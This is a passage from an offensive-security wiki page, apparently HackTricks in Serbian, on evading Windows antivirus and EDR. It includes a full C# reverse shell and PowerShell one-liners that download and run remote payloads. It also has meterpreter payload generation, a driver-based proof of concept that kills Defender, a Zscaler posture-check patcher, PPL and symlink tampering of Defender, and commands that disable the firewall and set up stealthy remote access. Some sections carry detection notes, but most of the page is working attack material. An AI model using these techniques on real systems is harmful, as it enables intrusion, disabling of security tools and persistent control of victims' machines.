Dozvoljavanjem pristupa interpreter binarima i okruženju na SMB deljenju možete **izvršavati proizvoljni kod u tim jezicima unutar memorije** kompromitovanog računara.

Repo navodi: Defender i dalje skenira skripte, ali korišćenjem Go, Java, PHP itd. imamo **više fleksibilnosti da zaobiđemo statičke potpise**. Testiranje sa slučajnim neobfuskiranim reverse shell skriptama u ovim jezicima pokazalo se uspešnim.

## TokenStomping

Token stomping je tehnika koja omogućava napadaču da **manipuliše access token-om ili sigurnosnim proizvodom kao što su EDR ili AV**, smanjujući njihove privilegije tako da proces ne umre, ali nema dozvole da proverava zlonamerne aktivnosti.

Da bi se ovo sprečilo, Windows bi mogao **onemogućiti eksternim procesima** da dobijaju handle-ove nad tokenima sigurnosnih procesa.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Kao što je opisano u [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), lako je samo instalirati Chrome Remote Desktop na žrtvin računar i koristiti ga za preuzimanje kontrole i održavanje perzistencije:
1. Preuzmite sa https://remotedesktop.google.com/, kliknite na "Set up via SSH", a zatim kliknite na MSI fajl za Windows da ga preuzmete.
2. Pokrenite installer tiho na žrtvi (zahteva admin privilegije): `msiexec /i chromeremotedesktophost.msi /qn`
3. Vratite se na stranicu Chrome Remote Desktop i kliknite Next. Čarobnjak će zatim zatražiti autorizaciju; kliknite Authorize da nastavite.
4. Izvršite dati parametar uz neke prilagodbe: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Obratite pažnju na parametar pin koji omogućava postavljanje PIN-a bez korišćenja GUI-ja).


## Advanced Evasion

Evasion je veoma komplikovana tema; ponekad morate uzeti u obzir mnoge različite izvore telemetrije u samo jednom sistemu, tako da je gotovo nemoguće ostati potpuno neotkriven u zrelim okruženjima.

Svako okruženje protiv kojeg se borite ima svoje snage i slabosti.

Toplo vam preporučujem da pogledate ovaj govor od [@ATTL4S](https://twitter.com/DaniLJ94), kako biste stekli uvid u naprednije tehnike evazije.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Ovo je takođe odličan govor od [@mariuszbit](https://twitter.com/mariuszbit) o Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Možete koristiti [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) koji će **uklanjati delove binarnog fajla** dok ne **utvrdi koji deo Defender smatra zlonamernim** i prikaže vam to.\
Drugi alat koji radi **istu stvar je** [**avred**](https://github.com/dobin/avred) sa javnom web uslugom na [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Do Windows 10, svi Windows su dolazili sa **Telnet serverom** koji ste mogli instalirati (kao administrator) uradivši:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Neka se **pokrene** pri pokretanju sistema i **pokreni** ga sada:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Promeni telnet port** (stealth) i onemogući firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)

**ON THE HOST**: Pokrenite _**winvnc.exe**_ i konfigurišite server:

- Enable the option _Disable TrayIcon_
- Set a password in _VNC Password_
- Set a password in _View-Only Password_

Zatim, premestite binarni fajl _**winvnc.exe**_ i **novokreiranu** datoteku _**UltraVNC.ini**_ na **victim**

#### **Reverse connection**

The **attacker** treba da na svom **host** pokrene binarni fajl `vncviewer.exe -listen 5900` kako bi bio **spreman** da prihvati reverse **VNC connection**. Zatim, na **victim**: pokrenite winvnc daemon `winvnc.exe -run` i pokrenite `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Da biste ostali prikriveni ne smete da uradite sledeće

- Don't start `winvnc` if it's already running or you'll trigger a [popup](https://i.imgur.com/1SROTTl.png). check if it's running with `tasklist | findstr winvnc`
- Don't start `winvnc` without `UltraVNC.ini` in the same directory or it will cause [the config window](https://i.imgur.com/rfMQWcf.png) to open
- Don't run `winvnc -h` for help or you'll trigger a [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Unutar GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Sada **pokreni lister** sa `msfconsole -r file.rc` i **izvrši** **xml payload** sa:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Trenutni Defender će veoma brzo prekinuti proces.**

### Kompajliranje sopstvenog reverse shell-a

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prvi C# Revershell

Kompajlirajte ga pomoću:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Koristite ga са:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using kompajler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatsko preuzimanje i izvršavanje:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Korišćenje Python-a za primer izrade injectora:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ostali alati
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Više

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 je iskoristio mali konzolni alat poznat kao **Antivirus Terminator** da onemogući endpoint zaštite pre nego što pusti ransomware. Alat donosi svoj **ranjivi ali *potpisani* driver** i zloupotrebljava ga za izvršavanje privilegovanih kernel operacija koje čak ni Protected-Process-Light (PPL) AV servisi ne mogu da blokiraju.

Ključni zaključci
1. **Signed driver**: Datoteka isporučena na disk je `ServiceMouse.sys`, ali binar je legitimno potpisani driver `AToolsKrnl64.sys` iz Antiy Labs’ “System In-Depth Analysis Toolkit”. Pošto driver nosi važeći Microsoft potpis, učitava se čak i kada je Driver-Signature-Enforcement (DSE) omogućen.
2. **Instalacija servisa**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Prvi red registruje driver kao **kernel servis**, a drugi ga pokreće tako da `\\.\ServiceMouse` postane dostupan iz korisničkog prostora.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Prekini proizvoljan proces po PID-u (koristi se za ubijanje Defender/EDR servisa) |
| `0x990000D0` | Obriši proizvoljnu datoteku na disku |
| `0x990001D0` | Ukloni driver iz kernela i obriši servis |

Minimalni C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Zašto ovo radi**: BYOVD potpuno zaobilazi zaštite u user-mode-u; kod koji se izvršava u kernelu može otvoriti *protected* procese, terminirati ih, ili manipulisati kernel objektima bez obzira na PPL/PP, ELAM ili druge hardening funkcije.

Detekcija / Mitigacija
•  Omogućite Microsoftovu listu blokiranih ranjivih drajvera (`HVCI`, `Smart App Control`) tako da Windows odbije da učita `AToolsKrnl64.sys`.  
•  Pratite kreiranje novih *kernel* servisa i alarmirajte kada se driver učita iz direktorijuma upisivog za sve ili nije prisutan na listi dozvoljenih.  
•  Pratite user-mode handle-ove ka prilagođenim device objektima praćene sumnjivim `DeviceIoControl` pozivima.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler-ov **Client Connector** primenjuje device-posture pravila lokalno i oslanja se na Windows RPC da komunikuje rezultate drugim komponentama. Dve slabe dizajnerske odluke omogućavaju potpuni bypass:

1. Procena posture se dešava **u potpunosti na klijentu** (serveru se šalje boolean).  
2. Interni RPC endpointi samo proveravaju da je povezani izvršni fajl **potpisan od strane Zscaler** (putem `WinVerifyTrust`).

Patch-ovanjem četiri potpisana binarna fajla na disku oba mehanizma mogu biti neutralisana:

| Binar | Originalna logika izmenjena | Rezultat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Uvek vraća `1` pa je svaki check u skladu |
| `ZSAService.exe` | Indirektan poziv ka `WinVerifyTrust` | NOP-ed ⇒ bilo koji (čak i nepotpisan) proces može da se poveže na RPC pipe-ove |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zamenjeno sa `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Provere integriteta tunela | Zaobilaženo |

Minimalni isječak patchera:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nakon zamene originalnih fajlova i restartovanja service stack-a:

* **All** posture checks prikazuju **green/compliant**.
* Unsigned ili modifikovani binarni fajlovi mogu da otvore named-pipe RPC endpoint-e (npr. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Kompromitovani host dobija neograničen pristup internal network definisanom Zscaler policies.

Ovaj case study pokazuje kako čisto client-side odluke o poverenju i jednostavne provere potpisa mogu biti zaobiđene sa nekoliko byte patch-eva.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) nameće hijerarhiju signer/level tako da samo procesi sa jednakim ili višim zaštitnim nivoom mogu da modifikuju jedni druge. Ofanzivno, ako možete legitimno pokrenuti PPL-enabled binary i kontrolisati njegove argumente, možete pretvoriti benignu funkcionalnost (npr. logging) u ograničeni, PPL-backed write primitive protiv zaštićenih direktorijuma koje koriste AV/EDR.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe` self-spawns and accepts a parameter to write a log file to a caller-specified path.
- When launched as a PPL process, the file write occurs with PPL backing.
- ClipUp cannot parse paths containing spaces; use 8.3 short paths to point into normally protected locations.

8.3 short path helpers
- List short names: `dir /x` in each parent directory.
- Derive short path in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Pokrenite PPL-capable LOLBIN (ClipUp) sa `CREATE_PROTECTED_PROCESS` koristeći pokretač (npr. CreateProcessAsPPL).
2) Prosledite ClipUp log-path argument da prisilite kreiranje fajla u zaštićenom AV direktorijumu (npr. Defender Platform). Koristite 8.3 short names ako je potrebno.
3) Ako je ciljani binarni fajl obično otvoren/zaključan od strane AV-a dok radi (npr. MsMpEng.exe), zakažite upis pri boot-u pre nego što AV startuje instaliranjem servisa sa automatskim startom koji pouzdano radi ranije. Potvrdite redosled podizanja sa Process Monitor (boot logging).
4) Nakon reboot-a, PPL-backed upis se dešava pre nego što AV zaključa svoje binarne fajlove, korumpirajući ciljani fajl i sprečavajući njegovo pokretanje.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Beleške i ograničenja
- Ne možete kontrolisati sadržaj koji ClipUp upisuje osim pozicioniranja; primitiv je pogodan za korupciju više nego za precizno ubacivanje sadržaja.
- Zahteva lokalnog administratora/SYSTEM za instalaciju/pokretanje servisa i mogućnost restartovanja.
- Vreme je kritično: ciljna datoteka ne sme biti otvorena; izvršavanje pri boot-u izbegava zaključavanja fajlova.

Detekcije
- Kreiranje procesa `ClipUp.exe` sa neobičnim argumentima, posebno ako je pokrenut od netipičnih procesa-roditelja, u vreme boot-a.
- Novi servisi konfigurisani da automatski startuju sumnjive binarije i dosledno se pokreću pre Defender/AV. Istražite kreiranje/izmenu servisa pre nego što se jave greške pri pokretanju Defender-a.
- Nadzor integriteta fajlova na Defender binarijama/Platform direktorijumima; neočekivana kreiranja/izmene fajlova od procesa sa protected-process zastavicom.
- ETW/EDR telemetrija: tražite procese kreirane sa `CREATE_PROTECTED_PROCESS` i anomalno korišćenje PPL nivoa od strane binarija koje nisu AV.

Mitigacije
- WDAC/Code Integrity: ograničite koji potpisani binariji smeju da se izvršavaju kao PPL i pod kojim roditeljima; blokirajte pozive ClipUp izvan legitimnih konteksta.
- Higijena servisa: ograničite kreiranje/izmenu auto-start servisa i pratite manipulacije redosledom startovanja.
- Osigurajte da su Defender tamper protection i early-launch protections uključeni; istražite greške pri startovanju koje ukazuju na korupciju binarija.
- Razmotrite onemogućavanje generisanja 8.3 short-name na volumenima koji hostuju sigurnosne alate ako je kompatibilno sa vašim okruženjem (temeljno testirajte).

Reference za PPL i alate
- Pregled Microsoft Protected Processes: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU referenca: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (provera redosleda): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Opis tehnike (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender chooses the platform it runs from by enumerating subfolders under:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

It selects the subfolder with the highest lexicographic version string (e.g., `4.18.25070.5-0`), then starts the Defender service processes from there (updating service/registry paths accordingly). This selection trusts directory entries including directory reparse points (symlinks). An administrator can leverage this to redirect Defender to an attacker-writable path and achieve DLL sideloading or service disruption.

Preduslovi
- Lokalni administrator (potreban za kreiranje direktorijuma/symlinks u Platform folderu)
- Mogućnost restartovanja ili izazivanja ponovne selekcije Defender platforme (restart servisa pri boot-u)
- Potrebni su samo ugrađeni alati (mklink)

Zašto ovo radi
- Defender blokira upise u svoje foldere, ali izbor platforme veruje unosima direktorijuma i bira leksikografski najvišu verziju bez validacije da li cilj rešava na zaštićenu/pouzdanu putanju.

Korak po korak (primer)
1) Pripremite zapisivu kopiju trenutnog Platform foldera, npr. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Kreirajte higher-version directory symlink unutar Platform koji pokazuje na vaš folder:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Izbor okidača (preporučeno ponovno pokretanje):
```cmd
shutdown /r /t 0
```
4) Proverite da li se MsMpEng.exe (WinDefend) pokreće sa preusmerenog puta:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Treba da primetite novu putanju procesa pod `C:\TMP\AV\` i konfiguraciju servisa/Windows registra koja odražava tu lokaciju.

Opcije nakon eksploatacije
- DLL sideloading/code execution: Postavite/zamenite DLL-ove koje Defender učitava iz svog direktorijuma aplikacije kako biste izvršili kod u Defender-ovim procesima. See the section above: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Uklonite version-symlink tako da pri sledećem pokretanju konfigurisana putanja neće biti rešena i Defender neće uspeti da se pokrene:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Imajte na umu da ova tehnika sama po sebi ne obezbeđuje eskalaciju privilegija; zahteva administratorska prava.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams mogu premestiti runtime evasion iz C2 implant-a u sam ciljni modul tako što će hook‑ovati njegov Import Address Table (IAT) i usmeriti odabrane API‑je kroz kod koji kontroliše napadač i koji je position‑independent (PIC). Ovo generalizuje izbegavanje detekcije izvan male površine API‑ja koju mnogi kitovi izlažu (npr. CreateProcessA) i proširuje iste zaštite na BOFs i post‑exploitation DLL‑ove.

Visok nivo pristupa
- Postavite PIC blob pored ciljног modula koristeći reflective loader (prepended ili companion). PIC mora biti samostalan i position‑independent.
- Dok se host DLL učitava, prođite kroz njegov IMAGE_IMPORT_DESCRIPTOR i patch‑ujte IAT unose za ciljane imports (npr. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) da ukazuju na tanke PIC wrapper‑e.
- Svaki PIC wrapper izvršava tehnike izbegavanja pre nego što izvrši tail‑call na stvarnu adresu API‑ja. Tipične tehnike izbegavanja uključuju:
  - Maskiranje/odmaskiranje memorije oko poziva (npr. enkriptovanje beacon regiona, RWX→RX, promena naziva/dozvola stranica), zatim vraćanje nakon poziva.
  - Call‑stack spoofing: konstruisati benigni stack i preći u ciljni API tako da analiza call‑stack‑a daje očekivane okvire.
- Za kompatibilnost, eksportujte interfejs tako da Aggressor skripta (ili ekvivalent) može registrovati koje API‑je hook‑ovati za Beacon, BOFs i post‑ex DLL‑ove.

Why IAT hooking here
- Radi za bilo koji kod koji koristi hook‑ovani import, bez modifikovanja koda alata ili oslanjanja na Beacon da proxy‑uje specifične API‑je.
- Obuhvata post‑ex DLL‑ove: hooking LoadLibrary* vam omogućava da presretnete učitavanja modula (npr. System.Management.Automation.dll, clr.dll) i primenite isto maskiranje/stack evasion na njihove pozive API‑ja.
- Vraća pouzdano korišćenje post‑ex komandi koje spawn‑uju procese protiv detekcija zasnovanih na call‑stack‑u tako što obavija CreateProcessA/W.

Minimalna skica IAT hook‑a (x64 C/C++ pseudokod)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Beleške
- Primeni patch nakon relocations/ASLR i pre prvog korišćenja importa. Reflective loaders poput TitanLdr/AceLdr pokazuju hooking tokom DllMain učitanog modula.
- Drži wrappers male i PIC-safe; resolve pravi API preko original IAT vrednosti koju si zabeležio pre patchovanja ili preko LdrGetProcedureAddress.
- Koristi RW → RX tranzicije za PIC i izbegavaj ostavljanje writable+executable stranica.

Call‑stack spoofing stub
- Draugr‑style PIC stubs konstruišu lažni lanac poziva (return addresses u benignim modulima) i zatim pivotuju u realni API.
- Ovo pobeđuje detekcije koje očekuju canonical stacks iz Beacon/BOFs ka sensitive APIs.
- Upari sa stack cutting/stack stitching tehnikama da se sletiš unutar očekivanih frejmova pre API prologa.

Operativna integracija
- Prependuj reflective loader u post‑ex DLL-ove tako da se PIC i hooks inicijalizuju automatski kad se DLL učita.
- Koristi Aggressor script da registruješ target APIs tako da Beacon i BOFs transparentno profitiraju od istog evasion puta bez izmena koda.

Detekcija/DFIR razmatranja
- IAT integrity: unosi koji resolve-uju na non‑image (heap/anon) adrese; periodična verifikacija import pointers.
- Stack anomalies: return addresses koji ne pripadaju učitanim image-ovima; nagle tranzicije u non‑image PIC; inconsistent RtlUserThreadStart ancestry.
- Loader telemetry: in‑process writes u IAT, rana DllMain aktivnost koja menja import thunks, neočekivane RX regije kreirane pri load-u.
- Image‑load evasion: ako hook-uješ LoadLibrary*, monitoruj sumnjiva učitavanja automation/clr assemblies u korelaciji sa memory masking događajima.

Povezani gradivni blokovi i primeri
- Reflective loaders koji vrše IAT patching tokom load-a (npr., TitanLdr, AceLdr)
- Memory masking hooks (npr., simplehook) i stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (npr., Draugr)

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
